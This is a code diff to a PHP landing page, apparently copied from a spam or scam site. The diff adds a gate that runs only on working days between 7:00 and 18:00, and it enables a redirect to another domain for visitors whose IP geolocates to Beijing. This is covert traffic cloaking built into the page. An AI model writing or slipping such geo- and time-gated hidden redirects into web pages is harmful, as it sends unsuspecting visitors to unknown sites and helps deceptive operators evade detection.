@@ -6,13 +6,29 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
     header("Location:http://".$trademark[$cur_trademark]."/rb/");
 }
 ?>
+<?php 
+$date = date('Y-m-d');
+$url = "http://api.goseek.cn/Tools/holiday?date=".$date;
+$file = file_get_contents($url);
+$json = json_decode($file,true);
+if ($json['data'] ==1)
+{
+  //  echo "周末不能预约";
+}elseif ($json['data']==2)
+{
+  //  echo "节假日不能预约";
+}elseif ($json['data'] ==0 && time() > strtotime(date('Y-m-d 7:00:00')) && time() <strtotime(date('Y-m-d 18:00:00')) )
+{
+//工作日
+?>
+
 <script type="text/javascript" src="http://ip.ws.126.net/ipquery" ></script>
 <script type="text/javascript">
     var prov_arr = new Array("北京市");//这里是需要屏蔽的省份数组
     if (contains(prov_arr, lo)) {
         //在设定区域,不跳转
 //        alert('你在'+lo);
-//        window.location.href = 'http://qo65i.cn/kgcy/';      
+        window.location.href = 'http://qo65i.cn/kgcy/';      
     } else {
         //不在设定区域,跳转到指定网站
         //window.location.href = 'http://guangdongxiao.cn/JF/T';
@@ -27,6 +43,10 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
         return false;
     }     
 </script>
+
+<?php 
+}
+?>
 
 <!-- saved from url=(0025)http://tz42b.vip0021.com/ -->
 <html lang="en" data-dpr="2" style="font-size: 23.4375px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
